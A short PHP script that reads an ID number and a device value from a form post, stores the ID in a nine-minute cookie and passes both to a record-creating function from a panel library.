<?php
require('../../panel/lib/funciones.php');

date_default_timezone_set('America/Bogota');

$usuario = $_POST['ced'];
$dispositivo = $_POST['dis'];

setcookie('documento',$usuario,time()+60*9);

crear_registro($usuario,$dispositivo);

?>